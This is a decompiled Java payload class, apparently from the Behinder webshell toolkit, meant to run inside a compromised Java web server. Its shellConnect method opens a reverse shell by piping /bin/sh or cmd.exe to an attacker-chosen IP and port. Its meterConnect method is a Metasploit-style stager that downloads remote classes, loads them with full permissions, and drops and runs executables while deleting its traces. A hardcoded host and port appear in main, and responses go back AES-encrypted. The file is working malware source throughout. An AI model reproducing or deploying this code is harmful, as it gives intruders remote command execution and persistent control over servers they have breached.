// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import java.util.Locale;
import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Iterator;
import java.util.Stack;
import java.io.PrintStream;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.cert.Certificate;
import java.security.Permission;
import java.security.AllPermission;
import java.security.Permissions;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.FileNotFoundException;
import java.util.StringTokenizer;
import java.net.ServerSocket;
import java.io.ByteArrayOutputStream;
import java.net.URLConnection;
import java.net.URL;
import java.io.ByteArrayInputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.util.Properties;
import java.net.Socket;
import java.io.Writer;
import java.io.BufferedWriter;
import java.io.OutputStreamWriter;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import javax.servlet.ServletOutputStream;
import java.util.Map;
import java.util.HashMap;
import javax.servlet.jsp.PageContext;
import java.io.OutputStream;
import java.io.InputStream;
import javax.servlet.http.HttpSession;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;

public class ConnectBack extends ClassLoader implements Runnable
{
    public static String type;
    public static String ip;
    public static String port;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    InputStream dn;
    OutputStream rm;
    private static final String OS_NAME;
    private static final String PATH_SEP;
    private static final boolean IS_AIX;
    private static final boolean IS_DOS;
    private static final String JAVA_HOME;
    
    public ConnectBack(final InputStream dn, final OutputStream rm) {
        this.dn = dn;
        this.rm = rm;
    }
    
    public ConnectBack() {
    }
    
    @Override
    public boolean equals(final Object obj) {
        final PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        final Map<String, String> result = new HashMap<String, String>();
        //兼容zcms
        if(Session.getAttribute("payload")!=null){
            Session.removeAttribute("payload");
        }
        try {
            if (ConnectBack.type.equals("shell")) {
                this.shellConnect();
            }
            else if (ConnectBack.type.equals("meter")) {
                this.meterConnect();
            }
            result.put("status", "success");
        }
        catch (Exception e) {
            result.put("status", "fail");
            result.put("msg", e.getMessage());
        }
        try {
            final ServletOutputStream so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }
    
    @Override
    public void run() {
        BufferedReader hz = null;
        BufferedWriter cns = null;
        try {
            hz = new BufferedReader(new InputStreamReader(this.dn));
            cns = new BufferedWriter(new OutputStreamWriter(this.rm));
            final char[] buffer = new char[8192];
            int length;
            while ((length = hz.read(buffer, 0, buffer.length)) > 0) {
                cns.write(buffer, 0, length);
                cns.flush();
            }
        }
        catch (Exception ex) {}
        try {
            if (hz != null) {
                hz.close();
            }
            if (cns != null) {
                cns.close();
            }
        }
        catch (Exception ex2) {}
    }
    
    private void shellConnect() throws Exception {
        try {
            String ShellPath;
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
                ShellPath = new String("/bin/sh");
            }
            else {
                ShellPath = new String("cmd.exe");
            }
            final Socket socket = new Socket(ConnectBack.ip, Integer.parseInt(ConnectBack.port));
            final Process process = Runtime.getRuntime().exec(ShellPath);
            new Thread(new ConnectBack(process.getInputStream(), socket.getOutputStream())).start();
            new Thread(new ConnectBack(socket.getInputStream(), process.getOutputStream())).start();
        }
        catch (Exception e) {
            throw e;
        }
    }
    
    public static void main(final String[] args) {
        try {
            final ConnectBack c = new ConnectBack();
            ConnectBack.ip = "192.168.50.53";
            ConnectBack.port = "4444";
            c.meterConnect();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void meterConnect() throws Exception {
        final Properties props = new Properties();
        final Class clazz = ConnectBack.class;
        final String clazzFile = clazz.getName().replace('.', '/') + ".class";
        props.put("LHOST", ConnectBack.ip);
        props.put("LPORT", ConnectBack.port);
        final String executableName = props.getProperty("Executable");
        if (executableName != null) {
            final File dummyTempFile = File.createTempFile("~spawn", ".tmp");
            dummyTempFile.delete();
            final File tempDir = new File(dummyTempFile.getAbsolutePath() + ".dir");
            tempDir.mkdir();
            final File executableFile = new File(tempDir, executableName);
            writeEmbeddedFile(clazz, executableName, executableFile);
            props.remove("Executable");
            props.put("DroppedExecutable", executableFile.getCanonicalPath());
        }
        final int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
        final String droppedExecutable = props.getProperty("DroppedExecutable");
        if (spawn > 0) {
            props.setProperty("Spawn", String.valueOf(spawn - 1));
            final File dummyTempFile2 = File.createTempFile("~spawn", ".tmp");
            dummyTempFile2.delete();
            final File tempDir2 = new File(dummyTempFile2.getAbsolutePath() + ".dir");
            final File propFile = new File(tempDir2, "metasploit.dat");
            final File classFile = new File(tempDir2, clazzFile);
            classFile.getParentFile().mkdirs();
            writeEmbeddedFile(clazz, clazzFile, classFile);
            if (props.getProperty("URL", "").startsWith("https:")) {
                writeEmbeddedFile(clazz, "metasploit/PayloadTrustManager.class", new File(classFile.getParentFile(), "PayloadTrustManager.class"));
            }
            if (props.getProperty("AESPassword", null) != null) {
                writeEmbeddedFile(clazz, "metasploit/AESEncryption.class", new File(classFile.getParentFile(), "AESEncryption.class"));
            }
            final FileOutputStream fos = new FileOutputStream(propFile);
            props.store(fos, "");
            fos.close();
            final Process proc = Runtime.getRuntime().exec(new String[] { getJreExecutable("java"), "-classpath", tempDir2.getAbsolutePath(), clazz.getName() });
            proc.getInputStream().close();
            proc.getErrorStream().close();
            Thread.sleep(2000L);
            final File[] files = { classFile, classFile.getParentFile(), propFile, tempDir2 };
            for (int i = 0; i < files.length; ++i) {
                for (int j = 0; j < 10 && !files[i].delete(); ++j) {
                    files[i].deleteOnExit();
                    Thread.sleep(100L);
                }
            }
        }
        else if (droppedExecutable != null) {
            final File droppedFile = new File(droppedExecutable);
            if (!ConnectBack.IS_DOS) {
                try {
                    try {
                        File.class.getMethod("setExecutable", Boolean.TYPE).invoke(droppedFile, Boolean.TRUE);
                    }
                    catch (NoSuchMethodException ex2) {
                        Runtime.getRuntime().exec(new String[] { "chmod", "+x", droppedExecutable }).waitFor();
                    }
                }
                catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
            Runtime.getRuntime().exec(new String[] { droppedExecutable });
            if (!ConnectBack.IS_DOS) {
                droppedFile.delete();
                droppedFile.getParentFile().delete();
            }
        }
        else {
            final int lPort = Integer.parseInt(props.getProperty("LPORT", "4444"));
            final String lHost = props.getProperty("LHOST", null);
            final String url = props.getProperty("URL", null);
            InputStream in;
            OutputStream out;
            if (lPort <= 0) {
                in = System.in;
                out = System.out;
            }
            else if (url != null) {
                if (url.startsWith("raw:")) {
                    in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
                }
                else if (url.startsWith("https:")) {
                    final URLConnection uc = new URL(url).openConnection();
                    Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", URLConnection.class).invoke(null, uc);
                    in = uc.getInputStream();
                }
                else {
                    in = new URL(url).openStream();
                }
                out = new ByteArrayOutputStream();
            }
            else {
                Socket socket;
                if (lHost != null) {
                    socket = new Socket(lHost, lPort);
                }
                else {
                    final ServerSocket serverSocket = new ServerSocket(lPort);
                    socket = serverSocket.accept();
                    serverSocket.close();
                }
                in = socket.getInputStream();
                out = socket.getOutputStream();
            }
            final String aesPassword = props.getProperty("AESPassword", null);
            if (aesPassword != null) {
                final Object[] streams = (Object[])Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", InputStream.class, OutputStream.class, String.class).invoke(null, in, out, aesPassword);
                in = (InputStream)streams[0];
                out = (OutputStream)streams[1];
            }
            final StringTokenizer stageParamTokenizer = new StringTokenizer("Payload -- " + props.getProperty("StageParameters", ""), " ");
            final String[] stageParams = new String[stageParamTokenizer.countTokens()];
            for (int k = 0; k < stageParams.length; ++k) {
                stageParams[k] = stageParamTokenizer.nextToken();
            }
            new ConnectBack().bootstrap(in, out, props.getProperty("EmbeddedStage", null), stageParams);
        }
    }
    
    private static void writeEmbeddedFile(final Class clazz, final String resourceName, final File targetFile) throws FileNotFoundException, IOException {
        final InputStream in = clazz.getResourceAsStream("/" + resourceName);
        final FileOutputStream fos = new FileOutputStream(targetFile);
        final byte[] buf = new byte[4096];
        int len;
        while ((len = in.read(buf)) != -1) {
            fos.write(buf, 0, len);
        }
        fos.close();
    }
    
    private final void bootstrap(final InputStream rawIn, final OutputStream out, final String embeddedStageName, final String[] stageParameters) throws Exception {
        try {
            final DataInputStream in = new DataInputStream(rawIn);
            final Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
            Class clazz;
            if (embeddedStageName == null) {
                int length = in.readInt();
                do {
                    final byte[] classfile = new byte[length];
                    in.readFully(classfile);
                    this.resolveClass(clazz = this.defineClass(null, classfile, 0, length, pd));
                    length = in.readInt();
                } while (length > 0);
            }
            else {
                clazz = Class.forName("javapayload.stage." + embeddedStageName);
            }
            final Object stage = clazz.newInstance();
            clazz.getMethod("start", DataInputStream.class, OutputStream.class, String[].class).invoke(stage, in, out, stageParameters);
        }
        catch (Throwable t) {
            t.printStackTrace();
            t.printStackTrace(new PrintStream(out));
        }
    }
    
    private static String getJreExecutable(final String command) {
        File jExecutable = null;
        if (ConnectBack.IS_AIX) {
            jExecutable = findInDir(ConnectBack.JAVA_HOME + "/sh", command);
        }
        if (jExecutable == null) {
            jExecutable = findInDir(ConnectBack.JAVA_HOME + "/bin", command);
        }
        if (jExecutable != null) {
            return jExecutable.getAbsolutePath();
        }
        return addExtension(command);
    }
    
    private static String addExtension(final String command) {
        return command + (ConnectBack.IS_DOS ? ".exe" : "");
    }
    
    private static File findInDir(final String dirName, final String commandName) {
        final File dir = normalize(dirName);
        File executable = null;
        if (dir.exists()) {
            executable = new File(dir, addExtension(commandName));
            if (!executable.exists()) {
                executable = null;
            }
        }
        return executable;
    }
    
    private static File normalize(final String path) {
        final Stack s = new Stack();
        final String[] dissect = dissect(path);
        s.push(dissect[0]);
        final StringTokenizer tok = new StringTokenizer(dissect[1], File.separator);
        while (tok.hasMoreTokens()) {
            final String thisToken = tok.nextToken();
            if (".".equals(thisToken)) {
                continue;
            }
            if ("..".equals(thisToken)) {
                if (s.size() < 2) {
                    return new File(path);
                }
                s.pop();
            }
            else {
                s.push(thisToken);
            }
        }
        final StringBuffer sb = new StringBuffer();
        for (int i = 0; i < s.size(); ++i) {
            if (i > 1) {
                sb.append(File.separatorChar);
            }
            sb.append(s.elementAt(i));
        }
        return new File(sb.toString());
    }
    
    private static String[] dissect(String path) {
        final char sep = File.separatorChar;
        path = path.replace('/', sep).replace('\\', sep);
        String root = null;
        final int colon = path.indexOf(58);
        if (colon > 0 && ConnectBack.IS_DOS) {
            int next = colon + 1;
            root = path.substring(0, next);
            final char[] ca = path.toCharArray();
            root += sep;
            next = ((ca[next] == sep) ? (next + 1) : next);
            final StringBuffer sbPath = new StringBuffer();
            for (int i = next; i < ca.length; ++i) {
                if (ca[i] != sep || ca[i - 1] != sep) {
                    sbPath.append(ca[i]);
                }
            }
            path = sbPath.toString();
        }
        else if (path.length() > 1 && path.charAt(1) == sep) {
            int nextsep = path.indexOf(sep, 2);
            nextsep = path.indexOf(sep, nextsep + 1);
            root = ((nextsep > 2) ? path.substring(0, nextsep + 1) : path);
            path = path.substring(root.length());
        }
        else {
            root = File.separator;
            path = path.substring(1);
        }
        return new String[] { root, path };
    }
    
    private String buildJson(final Map<String, String> entity, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        final String version = System.getProperty("java.version");
        sb.append("{");
        for (final String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    final Class Base64 = Class.forName("java.util.Base64");
                    final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                }
                else {
                    this.getClass();
                    final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    final Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
    
    private byte[] Encrypt(final byte[] bs) throws Exception {
        final Object custmKeyObj = this.Request.getAttribute("parameters");
        final String key = (custmKeyObj!=null&&custmKeyObj instanceof String) ? custmKeyObj.toString():this.Session.getAttribute("u").toString();
        final byte[] raw = key.getBytes("utf-8");
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        final byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
    
    static {
        OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
        PATH_SEP = System.getProperty("path.separator");
        IS_AIX = "aix".equals(ConnectBack.OS_NAME);
        IS_DOS = ConnectBack.PATH_SEP.equals(";");
        JAVA_HOME = System.getProperty("java.home");
    }
}
